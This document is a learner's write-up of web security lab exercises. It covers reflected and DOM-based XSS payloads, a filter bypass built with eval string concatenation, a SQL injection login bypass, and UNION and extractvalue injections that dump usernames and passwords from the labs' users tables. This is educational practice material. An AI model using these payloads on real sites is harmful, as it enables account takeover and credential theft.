# XSS
## REFLECTED XSS
In this the lab contains a simple reflected xss vulnerability, where we need to use alert () function to solve it.
I called the alert function with the payload `<script>alert(0)</script>`
## DOM BASED XSS
This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.
To solve this lab, perform a cross-site scripting attack that calls the alert function.
I called the alert function with the payload `"><svg onload=alert()>`
## THE CLIENT SIDE
In this we need to use the alert function to pop up a dialogue box, but if we try it in the traditional way, it says sus link detected and eliminated, after digging a little bit into it I found that thescript filtered it out with the line
`if(link.includes("alert")){
                document.write("sus link detected.....and eliminated");
                document.body.innerHTML += "<br><a href='javascript:location.reload()'>Reload</a>";
            }`
which filters the link if it contains the word alert in it. And neither aLeRt, or changing any letters to capital would work since all letters are converted into lowercase and this turn the aLeRt into alert which gets filtered by the system.
So I used eval function and broke the function into two strings "aler" + "t()" which looks like eval("aler"+"t()"). Now this can bypass the filter since it is intercepted as aler + t() which is not alert() directly.
Here we are using eval() because with the <script> tag it cant understand or merge the two sperate strings.
# SQL Injection
## LAB LOGIN BYPASS
This is a simple login webpage. I tried to enter the username as `administrator'--+` because generally the usernames are sent to the backend by enclosing them in a string and the password is also in the same line so we can comment it out by passing `--+`. And henceforth the system only checks for the usernae and gives us the acess to the account.
## UNION ATTACK
In this we try to breach the usernames and passwords from the backend database. first we check the number of columns containg strings by the payload `' union select 'username','password'--+`. This should print the texts username and password indicating there are 2 columns which columns contain text data. So we make our final payload as `' union select username,password from users --+` which selects both the columns.
## SQLI LABS

### GENERAL APPROACH
1)	First we can check for possible sql injections using `‘`and `‘’`
2)	Then we fuzz around trying to get the syntax of the code
3)	Then we try to make the first statement false by providing something like id=-1. Since we know id is not generally negative. 
4)	We have done this to use the UNION SELECT statement. So if the first one is false so will be the 
5)	`localhost/sqli-labs/Less-1/?id=-1' UNION SELECT ‘a’,'b',database()--+` doing this will get us the name of the database
6)	Then we can type `localhost/sqli-labs/Less-1/?id=' union select NULL,NULL,column_name from information_schema.columns where  table_schema=database() and table_name='users' limit 0,1--+`
7)	To domp all the data from those sql databases.

### LAB 1
`?id=-1’ union select 1,group_concat(username),group_concat(password) from users --+` to break the code
### LAB 2
This accept only integers so it cannot take strings as input

`?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20users%20--+` 
### LAB 3
Same as the first one with the addition of a bracket 

`?id=-1%27)union%20select%201,group_concat(username),group_concat(password)%20from%20users%20--+`
### LAB 4
This is a double quote query

`?id=-1") union select 1,group_concat(username),group_concat(password) from users--+` breaks the code
### LAB 5
In this even if we change the id the webpage does not change in any manner. 
So here we use extractvalue()
1) We get the name of the database by 
   `?id=1' and extractvalue(0x0a,concat(0x0a,(select database())))--+`
2) We then get the table names by
    `?id=1' and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 3,1)))--+`
3) Then we can view columns in users table by
   `?id=1'  and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1)))--+`
   `?id=1'  and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 2,1)))--+`
5)  Then we can dump the data by iterating over the values by
   `?id=1' and extractvalue(0x0a,concat(0x0a,(select concat(username,':',password) from users limit 0,1)))--+`

 
